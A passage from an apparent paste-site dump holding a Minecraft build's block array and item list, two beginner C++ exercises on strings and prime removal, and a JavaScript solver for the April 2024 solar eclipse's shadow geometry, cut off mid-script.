0,0,0,0,0,4,5,0,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,8,8,1,1,1,8,8,1,1,1,0,0,0,0,0,0,4,3,5,0,0,0,0,0,0,0,6,3,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,1,1,8,8,8,8,1,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,1,8,8,8,8,1,1,1,8,8,8,8,1,1,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,10,1,11,1,1,0,0,0,0,0,0,0,2,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,2,0,0,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,1,12,10,1,11,10,1,1,0,0,0,0,0,0,1,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,12,12,10,1,11,10,10,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,13,13,13,10,1,13,13,13,13,1,0,0,0,0,0,1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,1,1,0,1,1,0,0,0,0,0,0,2,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,2,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,12,12,12,12,1,11,12,12,12,1,0,0,0,0,0,1,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,11,11,10,1,11,13,13,1,1,0,0,0,0,0,2,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,2,0,0,2,7,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,1,11,10,1,11,13,1,1,0,0,0,0,0,0,0,1,1,8,8,8,8,1,1,1,8,8,8,8,1,1,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,10,1,11,1,1,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,1,1,8,8,8,8,1,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,8,8,1,1,1,8,8,1,1,1,0,0,0,0,0,0,6,3,7,0,0,0,0,0,0,0,4,3,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,6,7,0,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,1,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,2,3,3,3,3,3,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}"",
  ""requiredItems"": {
    ""twilightforest:twilight_oak_planks"": 457,
    ""minecraft:mangrove_trapdoor"": 40,
    ""minecraft:mangrove_planks"": 80,
    ""minecraft:mangrove_log"": 58,
    ""minecraft:mangrove_fence"": 56
  }
}"
f7r0e7aK,Untitled,35657,C++,Saturday 13th of April 2024 01:39:16 AM CDT,"#include <iostream> 

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    const int size = 5;

    char line[size]{ 'C', 'a', 't', '!', '\0'}; // строкой называется символьный массив с терминальным нулем в конце

    cout << line << endl; // выводит строку в консоль можно без цикла

    char new_line[] = ""Cat!""; // инициализировать строку можно через = (присваивание)

    cout << new_line << endl;

    char new_line2[40];

    cin >> new_line2; // считывать строку можно в заранне подготовленный массив без цикла

    cout << new_line2 << endl;
}"
0vaX18n1,Untitled,35657,C++,Saturday 13th of April 2024 01:05:07 AM CDT,"#include <iostream> 

using namespace std;

void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void fill(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 10;
    }
}

bool is_simple(int number) {
    for (int i = 2; i <= number / 2; i++) {
        if (number % i == 0) {
            return false;
        }
    }
    return true;
}

void remove_simple(int*& arr, int& size) {
    int temp_size = size;

    int* temp = new int[temp_size];

    int count = 0;

    for (int i = 0; i < size; i++) {
        if (!is_simple(arr[i])) {
            temp[count++] = arr[i];
        }
    }

    delete[] arr;

    arr = new int[count];

    size = count;

    for (int i = 0; i < size; i++) {
        arr[i] = temp[i];
    }

    delete[] temp;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    int size;

    cout << ""Введите размер массива: "";
    cin >> size;

    int* arr = new int[size];

    fill(arr, size);
    print(arr, size);

    remove_simple(arr, size);

    print(arr, size);

    delete[] arr;
}"
RjfGbKL6,Eclipse solver,onlinebacon,JavaScript,Saturday 13th of April 2024 12:49:03 AM CDT,"// -------------------------------------------------------------------------- //
// BUILT IN MATH FUNCTIONS AND GENERAL TRIG FUNCTIONS ----------------------- //
// -------------------------------------------------------------------------- //

const { PI, abs, sqrt, sign, sin, cos, tan, asin, acos, atan } = Math;

const TAU = PI * 2;
const D90 = PI / 2;
const D30 = PI / 6;

const toRad = (deg) => deg / 180 * PI;
const toDeg = (rad) => rad / PI * 180;

const oneWayAngleDiff = (a, b) => {
	return a < b ? a + TAU - b : a - b;
};

// -------------------------------------------------------------------------- //
// CONSTANTS ---------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const SEC = 1000;
const MIN = SEC * 60;
const HOUR = MIN * 60;
const KM = 1;
const MILE = 1.609344 * KM;
const AU = 150e6 * KM;
const KMPH = KM / HOUR;
const MPH = MILE / HOUR;

const moonRadius = 1737.4 * KM;
const earthRadius = 6371 * KM;
const sunRadius = (1392700 / 2) * KM;

const overrideMoonDist = 359829 * KM;
const overrideSunDist = 149820729 * KM;

// -------------------------------------------------------------------------- //
// AUXILIAR FUNCTIONS ------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const parseAngle = (string) => {
	const sepRegex = /^\s*[°'""]\s*|\s+/;
	const numRegex = /^\d+(\.\d+)?/;
	const unitMap = {
		'°': 1,
		""'"": 1 / 60,
		'""': 1 / 60 / 60,
	};
	string = string.trim();
	let sign = 1;
	if (string.startsWith('-')) {
		sign = -1;
		string = string.substring(1).trim();
	}
	let sum = 0;
	let unit = 1;
	while (string.length > 0) {
		const num = string.match(numRegex)?.[0];
		if (!num) {
			return NaN;
		}
		string = string.substring(num.length);
		const sep = string.match(sepRegex)?.[0];
		if (sep) {
			string = string.substring(sep.length);
			const short = sep.trim();
			if (short !== '') {
				unit = unitMap[short];
			}
		} else if (string !== '') {
			return NaN;
		}
		sum += num * unit;
		unit /= 60;
	}
	return toRad(sum * sign);
};

const round = (value, n = 0) => {
	return Number(value.toFixed(n));
};

const strAngle = (angle, pos = '', neg = '-') => {
	const tSec = round(toDeg(abs(angle)) * 3600, 1);
	const sec = round(tSec % 60, 1);
	const tMin = round((tSec - sec)/60);
	const min = round(tMin % 60);
	const deg = round((tMin - min)/60);
	const sign = angle < 0 ? neg : pos;
	return `${sign}${deg}°${min}'${sec}"" / ${round(toDeg(angle), 6).toString()}°`;
};

const numberWithNDigits = (num, n, suffix = '') => {
	if (abs(num) >= (10 ** n)) {
		return Math.round(num).toString() + suffix;
	}
	return Number(num.toPrecision(n)) + suffix;
};

const strDist = (dist, n = 5) => {
	const km = numberWithNDigits(dist/KM, n, ' km');
	const mi = numberWithNDigits(dist/MILE, n, ' mi');
	return  `${km} / ${mi}`;
};

const strSpeed = (speed, n = 5) => {
	const kmph = numberWithNDigits(speed / KMPH, n, ' km/h');
	const mph = numberWithNDigits(speed / MPH, n, ' mph');
	return `${kmph} / ${mph}`;
};

const strTime = (timestamp) => {
	const date = new Date(timestamp).toISOString();
	return date.replace(/^.*T/, '').replace('Z', ' (UTC)');
};

const strDuration = (duration) => {
	const tSec = round(duration / SEC);
	const sec = tSec % 60;
	const tMin = (tSec - sec)/60;
	const min = tMin % 60;
	const hrs = (tMin - min)/60;
	const strSec = sec.toString().padStart(2, '0');
	const strMin = min.toString().padStart(2, '0');
	const strHrs = hrs.toString().padStart(2, '0');
	return `${strHrs}h${strMin}m${strSec}s`;
};

// -------------------------------------------------------------------------- //
// DATA PARSING ------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const table = [];

const addAlmanacData = (text) => {
	let date = null;
	const lines = text.trim().split(/\n/);
	for (let line of lines) {
		line = line.trim();
		if (line.startsWith('#')) {
			continue;
		}
		if (/^date:/i.test(line)) {
			const strDate = line.replace(/^date:/i, '').trim();
			const isoDate = strDate + 'T00:00:00Z';
			date = new Date(isoDate).getTime();
			continue;
		}
		const [ hour, ...angles ] = line.trim().split(/\s*\|\s*/);
		const time = date + hour * HOUR;
		const [ sunGHA, sunDec, moonGHA, moonDec, moonHP ] = angles.map(parseAngle);
		const obj = { time, sunGHA, sunDec, moonGHA, moonDec, moonHP };
		table.push(obj);
	}
};

const interpolate = (time, field) => {
	for (let i=1; i<table.length; i++) {
		const bef = table[i - 1];
		if (time < bef.time) {
			continue;
		}
		const aft = table[i];
		if (time > aft.time) {
			continue;
		}
		const t = (time - bef.time) / (aft.time - bef.time);
		const a = bef[field];
		const b = aft[field];
		return a + (b - a) * t;
	}
	throw new Error(`time ${new Date(time).toISOString()} is out of bounds`);
};

// -------------------------------------------------------------------------- //
// VECTOR OPERATIONS (LINEAR ALGEBRA) --------------------------------------- //
// -------------------------------------------------------------------------- //

const subVec = ([ ax, ay, az ], [ bx, by, bz ]) => {
	return [ ax - bx, ay - by, az - bz ];
};

const sumVec = ([ ax, ay, az ], [ bx, by, bz ]) => {
	return [ ax + bx, ay + by, az + bz ];
};

const normalizeVec = ([ x, y, z ]) => {
	const len = sqrt(x*x + y*y + z*z);
	return [ x/len, y/len, z/len ];
};

const dotProd = (a, b) => {
	const [ ax, ay, az ] = a;
	const [ bx, by, bz ] = b;
	return (ax * bx) + (ay * by) + (az * bz);
};

const scaleVec = (vec, val) => {
	const [ x, y, z ] = vec;
	return [ x*val, y*val, z*val ];
};

const vecLen = ([ x, y, z ]) => {
	return sqrt(x*x + y*y + z*z);
};

const rotVecY = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x*c - z*s, y, z*c + x*s ];
};

const rotVecX = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x, y*c + z*s, z*c - y*s ];
};

const rotVecZ = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x*c + y*s, y*c - x*s, z ];
};

const vecIsValid = ([ x, y, z ]) => {
	return !(isNaN(x) || isNaN(y) || isNaN(z));
};

// -------------------------------------------------------------------------- //
// LAT/LONG MATH ------------------------------------------------------------ //
// -------------------------------------------------------------------------- //

// Geocentric
const GC = {
	vecToGP: (vec) => {
		const [ x, y, z ] = normalizeVec(vec);
		const lat = asin(z);
		const len = sqrt(x*x + y*y);
		const lon = len === 0 ? 0 : acos(x/len) * (y < 0 ? -1 : 1);
		return [ lat, lon ];
	},
	gpToUnitVec: (gp) => {
		const [ lat, lon ] = gp;
		const x = + cos(lat) * cos(lon);
		const y = + cos(lat) * sin(lon);
		const z = + sin(lat);
		return [ x, y, z ];
	},
	gpDistToVec: (gp, dist) => {
		const vec = GC.gpToUnitVec(gp);
		return scaleVec(vec, dist);
	},
	calcAngle: (gp1, gp2) => {
		const aVec = GC.gpToUnitVec(gp1);
		const bVec = GC.gpToUnitVec(gp2);
		return acos(dotProd(aVec, bVec));
	},
	calcDistance: (gp1, gp2) => {
		return GC.calcAngle(gp1, gp2) * earthRadius;
	},
	calcAzimuth: (gp1, gp2) => {
		const [ lat1, lon1 ] = gp1;
		const [ lat2, lon2 ] = gp2;
		const dlon = lon2 - lon1;
		const x = cos(lat2) * cos(dlon);
		const y = cos(lat2) * sin(dlon);
		const z = sin(lat2);
		const newZ = z*cos(lat1) - x*sin(lat1);
		const east = acos(newZ/sqrt(newZ ** 2 + y ** 2));
		return y >= 0 ? east : TAU - east;
	},
};

// -------------------------------------------------------------------------- //
// ECLIPSE MATH ------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const ghaToLon = (gha) => {
	return (TAU*1.5 - gha) % TAU - PI;
};

const getMoonGhaDec = (time) => {
	const gha = interpolate(time, 'moonGHA');
	const dec = interpolate(time, 'moonDec');
	return [ gha, dec ];
};

const getSunGhaDec = (time) => {
	const gha = interpolate(time, 'sunGHA');
	const dec = interpolate(time, 'sunDec');
	return [ gha, dec ];
};

const hpToDist = (hp) => {
	const dist = earthRadius / tan(hp);
	return dist;
};

const findGHAMeridianMatch = () => {
	for (let i=1; i<table.length; ++i) {
		const bef = table[i - 1];
		const aft = table[i];
		const sunApproaching = oneWayAngleDiff(bef.moonGHA, bef.sunGHA) < D30;
		const sunPasses = oneWayAngleDiff(aft.sunGHA, aft.moonGHA) < D30;
		if (!sunApproaching || !sunPasses) {
			continue;
		}
		const dt = aft.time - bef.time;
		const dSun = aft.sunGHA - bef.sunGHA;
		const dMoon = aft.moonGHA - bef.moonGHA;
		const t = (bef.moonGHA - bef.sunGHA) / (dSun - dMoon);
		const time = bef.time + dt * t;
		return time;
	}
	return null;
};

const ghaDecDistToVec = (gha, dec, dist) => {
	const gp = [ dec, ghaToLon(gha) ];
	return GC.gpDistToVec(gp, dist);
};

const getMoonDist = (time) => {
	return overrideMoonDist ?? hpToDist(interpolate(time, 'moonHP'));
};

const getMoonVec = (time) => {
	const [ gha, dec ] = getMoonGhaDec(time);
	const dist = getMoonDist(time);
	return ghaDecDistToVec(gha, dec, dist);
};

const getSunDist = (time) => {
	return overrideSunDist ?? AU;
};

const getSunVec = (time) => {
	const [ gha, dec ] = getSunGhaDec(time);
	const dist = getSunDist(time);
	return ghaDecDistToVec(gha, dec, dist);
};

const getCenterShadowRay = (moonVec, sunVec) => {
	const dir = normalizeVec(subVec(moonVec, sunVec));
	const origin = moonVec;
	return { origin, dir };
};

const rayEarthIntersection = ({ origin, dir }) => {
	const midT = dotProd(subVec([ 0, 0, 0 ], origin), dir);
	if (midT < 0) {
		return [ NaN, NaN, NaN ];
	}
	const midVec = sumVec(origin, scaleVec(dir, midT));
	const centerDist = vecLen(midVec);
	if (centerDist > earthRadius) {
		return [ NaN, NaN, NaN ];
	}
	const tDiff = sqrt(earthRadius**2 - centerDist**2);
	const t = midT - tDiff;
	return sumVec(origin, scaleVec(dir, t));
};

const calcUmbraAngle = (moonSunDist) => {
	return asin((sunRadius - moonRadius)/moonSunDist);
};

const calcPenumbraAngle = (moonSunDist) => {
	return - asin((sunRadius + moonRadius)/moonSunDist);
};

const buildShadowEdgeRay = (moonVec, sunVec, azimuth, calcAngle) => {
	const moonSunDist = vecLen(subVec(moonVec, sunVec));
	const angle = calcAngle(moonSunDist);
	
	let origin = [ 0, 0, moonRadius ];
	let dir = [ -1, 0, 0 ];

	origin = rotVecY(origin, angle);
	dir = rotVecY(dir, angle)

	origin = rotVecX(origin, azimuth);
	dir = rotVecX(dir, azimuth)

	const [ lat, lon ] = GC.vecToGP(subVec(sunVec, moonVec));

	origin = rotVecY(origin, lat);
	dir = rotVecY(dir, lat);

	origin = rotVecZ(origin, -lon);
	dir = rotVecZ(dir, -lon);

	origin = sumVec(origin, moonVec);

	return { origin, dir };
};

const getShadowEdgeCoord = (moonVec, sunVec, azimuth, calcAngle) => {
	return GC.vecToGP(
		rayEarthIntersection(
			buildShadowEdgeRay(moonVec, sunVec, azimuth, calcAngle),
		),
	);
};

const calcShadowSize = (moonVec, sunVec, azimuth, calcAngle) => {
	const az1 = azimuth;
	const az2 = (azimuth + PI) % TAU;
	const a = getShadowEdgeCoord(moonVec, sunVec, az1, calcAngle);
	const b = getShadowEdgeCoord(moonVec, sunVec, az2, calcAngle);
	return GC.calcDistance(a, b);
};

const calcVecs = (time) => {
	const moonVec = getMoonVec(time);
	const [ sunGHA, sunDec ] = getSunGhaDec(time);
	const sunGP = [ sunDec, ghaToLon(sunGHA) ];
	const sunDist = getSunDist(time);
	const sunVec = ghaDecDistToVec(sunGHA, sunDec, sunDist);
	const locVec = rayEarthIntersection(getCenterShadowRay(moonVec, sunVec));
	const loc = GC.vecToGP(locVec);
	return { sunGP, moonVec, sunVec, loc, locVec };
};

const hasTotality = (locVec, time) => {
	const { sunVec, moonVec } = calcVecs(time);
	const moonAngRad = calcAngularRadius(locVec, moonVec, moonRadius);
	const sunAngRad = calcAngularRadius(locVec, sunVec, sunRadius);
	const sunDir = normalizeVec(subVec(sunVec, locVec));
	const moonDir = normalizeVec(subVec(moonVec, locVec));
	const prod = dotProd(moonDir, sunDir);
	if (prod >= 1) {
		return true;
	}
	const angDist = acos(dotProd(moonDir, sunDir));
	const gap = moonAngRad - sunAngRad;
	return angDist <= gap;
};

const calcAngularRadius = (locVec, bodyVec, bodyRad) => {
	const dist = vecLen(subVec(locVec, bodyVec));
	return asin(bodyRad/dist);
};

const findTotalityEdgeAt = (locVec, startTime, endTime) => {
	let at = startTime;
	let av = hasTotality(locVec, at);
	let bt = endTime;
	let bv = hasTotality(locVec, bt);
	if (av === bv) {
		return null;
	}
	while (bt - at > 1) {
		const mt = (at + bt)/2;
		const mv = hasTotality(locVec, mt);
		if (mv === av) {
			at = mt;
			av = mv;
		} else {
			bt = mt;
			bv = mv;
		}
	}
	return (at + bt)/2;
};

// -------------------------------------------------------------------------- //
// MAIN --------------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

addAlmanacData(`
	Date: 2024-04-08
	# Hour | Sun GHA    | Sun Dec  | Moon GHA   | Moon Dec | Moon HP
	#------|------------|----------|------------|----------|---------
	  18   |  89° 35.5' | 7° 35.2' |  89° 54.4' | 7° 48.9' | 60.9'
	  19   | 104° 35.6' | 7° 36.2' | 104° 23.2' | 8° 06.3' | 60.9'
`);

const peakTime = findGHAMeridianMatch();
const { sunGP, moonVec, sunVec, loc, locVec } = calcVecs(peakTime);
const [ lat, lon ] = loc;
const umbraSizeNS = calcShadowSize(moonVec, sunVec,   0, calcUmbraAngle);
const umbraSizeEW = calcShadowSize(moonVec, sunVec, D90, calcUmbraAngle);
const penumbraSizeNS = calcShadowSize(moonVec, sunVec,   0, calcPenumbraAngle);
const penumbraSizeEW = calcShadowSize(moonVec, sunVec, D90, calcPenumbraAngle);
const sunAlt = D90 - GC.calcAngle(sunGP, loc);

const dtTime = 1 * SEC;
const nextTime = peakTime + dtTime;
const nextLoc = calcVecs(nextTime).loc;
const dtDist = GC.calcDistance(loc, nextLoc);
